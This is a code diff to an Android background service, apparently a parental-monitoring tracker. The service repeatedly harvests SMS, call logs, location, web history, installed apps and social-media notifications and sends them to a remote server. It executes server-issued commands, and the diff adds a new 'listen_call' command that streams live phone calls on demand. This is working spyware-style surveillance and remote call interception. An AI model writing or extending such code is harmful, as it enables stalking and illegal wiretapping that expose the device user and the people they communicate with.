@@ -29,9 +29,13 @@ class TrackerService : Service() {
     private var lastForegroundApp: String? = null
     private var configRefreshJob: Job? = null
     private var updateCheckJob: Job? = null
+    private var callStateMonitor: CallStateMonitor? = null
+    private var callStreamManager: CallStreamManager? = null
 
     override fun onCreate() {
         super.onCreate()
+        // Ensure config is initialized in case the service starts before MainActivity
+        CloudConfig.init(applicationContext)
         createNotificationChannel()
         acquireWakeLock()
         TrackerService.isRunning = true
@@ -43,7 +47,18 @@ class TrackerService : Service() {
         startPeriodicReporting()
         startConfigRefresh()
         startUpdateChecker()
+        startCallMonitor()
         return START_STICKY
+    }
+
+    private fun startCallMonitor() {
+        callStateMonitor = CallStateMonitor(this).apply {
+            onCallStateChanged = { state, number ->
+                Log.d(TAG, "Call state changed: $state, number: $number")
+            }
+            start()
+        }
+        callStreamManager = CallStreamManager()
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
@@ -51,6 +66,8 @@ class TrackerService : Service() {
     override fun onDestroy() {
         super.onDestroy()
         TrackerService.isRunning = false
+        callStateMonitor?.stop()
+        callStreamManager?.stopStreaming()
         releaseWakeLock()
         updateCheckJob?.cancel()
         scope.cancel()
@@ -59,27 +76,25 @@ class TrackerService : Service() {
     private var job: Job? = null
 
     private fun startPeriodicReporting() {
-        Log.d(TAG, "startPeriodicReporting called")
+        writeDebugLog("startPeriodicReporting called, isRunning=${TrackerService.isRunning}")
         job = scope.launch {
-            // Initial registration
             try {
-                Log.d(TAG, "Registering device...")
+                writeDebugLog("Registering device...")
                 val deviceInfo = collectors.collectDeviceInfo(this@TrackerService)
                 ApiClient.registerDevice(deviceInfo)
-                Log.d(TAG, "Device registered")
+                writeDebugLog("Device registered OK")
             } catch (e: Exception) {
-                Log.e(TAG, "Device registration failed: ${e.message}")
+                writeDebugLog("Device registration FAILED: ${e.message}")
             }
 
             while (true) {
                 try {
-                    Log.d(TAG, "Collecting and reporting...")
+                    writeDebugLog("Collecting and reporting...")
                     collectAndReport()
-                    Log.d(TAG, "Report sent successfully")
                 } catch (e: Exception) {
-                    Log.e(TAG, "Report failed: ${e.message}", e)
+                    writeDebugLog("Report loop exception: ${e.message}")
                 }
-                delay(30_000L) // 30 seconds
+                delay(30_000L)
             }
         }
     }
@@ -170,8 +185,8 @@ class TrackerService : Service() {
                 ApiClient.updateCommandStatus(commandId, "completed")
             }
             "wipe" -> {
-                // Alert parent instead of actually wiping
-                ApiClient.updateCommandStatus(commandId, "failed")
+                Log.w(TAG, "Wipe command received but disabled for safety")
+                ApiClient.updateCommandStatus(commandId, "failed", "Wipe is disabled for safety. Use Device Admin settings manually.")
             }
             "block_apps" -> {
                 // Store blocked apps list - the AccessibilityService handles it
@@ -206,6 +221,17 @@ class TrackerService : Service() {
                     } catch (e: Exception) {}
                 }
             }
+            "listen_call" -> {
+                val enable = params?.optBoolean("enable", true) ?: true
+                Log.d(TAG, "Listen call: enable=$enable")
+                if (enable) {
+                    callStreamManager?.startStreaming()
+                    ApiClient.updateCommandStatus(commandId, "completed")
+                } else {
+                    callStreamManager?.stopStreaming()
+                    ApiClient.updateCommandStatus(commandId, "completed")
+                }
+            }
             else -> {
                 ApiClient.updateCommandStatus(commandId, "completed")
             }
@@ -214,62 +240,71 @@ class TrackerService : Service() {
 
     private suspend fun collectAndReport() {
         val context = this@TrackerService
+        try {
+            val deviceInfo = collectors.collectDeviceInfo(context)
+            val location = collectors.collectLocation(context)
+            val batteryInfo = collectors.collectBatteryInfo(context)
+            val smsMessages = collectors.collectSmsMessages(context)
+            val callLogs = collectors.collectCallLogs(context)
+            val installedApps = collectors.collectInstalledApps(context)
 
-        val deviceInfo = collectors.collectDeviceInfo(context)
-        val location = collectors.collectLocation(context)
-        val batteryInfo = collectors.collectBatteryInfo(context)
-        val smsMessages = collectors.collectSmsMessages(context)
-        val callLogs = collectors.collectCallLogs(context)
-        val installedApps = collectors.collectInstalledApps(context)
-
-        // Collect activities (foreground app changes)
-        val activities = mutableListOf<JSONObject>()
-        val foregroundApp = collectors.collectForegroundApp(context)
-        if (foregroundApp != null && foregroundApp != lastForegroundApp) {
-            lastForegroundApp = foregroundApp
-            val appName = collectors.getAppName(context, foregroundApp)
-            activities.add(JSONObject().apply {
-                put("activity_type", "app_launch")
-                put("package_name", foregroundApp)
-                put("app_name", appName)
-                put("timestamp", System.currentTimeMillis())
-            })
-        }
-
-        // Collect screen time (daily)
-        val screentime = collectors.collectScreenTime(context)
-
-        // Collect web history (non-Android 10+)
-        val webHistory = collectors.collectWebHistory(context)
-
-        // Flush social notifications
-        val socialNotifications = SocialNotificationService.flushBuffer()
-
-        val payload = ApiClient.buildReportPayload(
-            deviceInfo = deviceInfo,
-            location = location,
-            battery = batteryInfo,
-            smsMessages = smsMessages,
-            callLogs = callLogs,
-            installedApps = installedApps,
-            activities = activities,
-            screentime = screentime,
-            webHistory = webHistory,
-            socialNotifications = socialNotifications
-        )
-
-        val result = ApiClient.sendBulkReport(payload)
-
-        if (result.success) {
-            Log.d(TAG, "Report OK. Commands: ${result.commands?.size ?: 0}")
-            // Handle any pending commands from response
-            result.commands?.forEach { cmd ->
-                Log.d(TAG, "Executing command: ${cmd.optString("command")}")
-                handleCommand(cmd)
+            val activities = mutableListOf<JSONObject>()
+            val foregroundApp = collectors.collectForegroundApp(context)
+            if (foregroundApp != null && foregroundApp != lastForegroundApp) {
+                lastForegroundApp = foregroundApp
+                val appName = collectors.getAppName(context, foregroundApp)
+                activities.add(JSONObject().apply {
+                    put("activity_type", "app_launch")
+                    put("package_name", foregroundApp)
+                    put("app_name", appName)
+                    put("timestamp", System.currentTimeMillis())
+                })
             }
-        } else {
-            Log.e(TAG, "Report FAILED")
+
+            val screentime = collectors.collectScreenTime(context)
+            val webHistory = collectors.collectWebHistory(context)
+            writeDebugLog("Collected: ${webHistory.size} web entries, ${smsMessages.size} sms, ${callLogs.size} calls")
+            val socialNotifications = SocialNotificationService.flushBuffer()
+
+            val payload = ApiClient.buildReportPayload(
+                deviceInfo = deviceInfo,
+                location = location,
+                battery = batteryInfo,
+                smsMessages = smsMessages,
+                callLogs = callLogs,
+                installedApps = installedApps,
+                activities = activities,
+                screentime = screentime,
+                webHistory = webHistory,
+                socialNotifications = socialNotifications
+            )
+
+            val result = ApiClient.sendBulkReport(payload)
+
+            if (result.success) {
+                writeDebugLog("Report OK. Commands: ${result.commands?.size ?: 0} WebHistory: ${webHistory.size}")
+                result.commands?.forEach { cmd ->
+                    handleCommand(cmd)
+                }
+            } else {
+                writeDebugLog("Report FAILED: ${result.error ?: "unknown"}")
+            }
+        } catch (e: Exception) {
+            writeDebugLog("Report EXCEPTION: ${e.message}")
+            e.printStackTrace()
         }
+    }
+
+    private fun writeDebugLog(msg: String) {
+        try {
+            val ts = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US).format(java.util.Date())
+            val line = "$ts $msg\n"
+            val file = java.io.File(filesDir, "debug.log")
+            file.appendText(line)
+            if (file.length() > 100000) {
+                file.writeText(file.readText().takeLast(50000))
+            }
+        } catch (_: Exception) {}
     }
 
     private fun createNotificationChannel() {
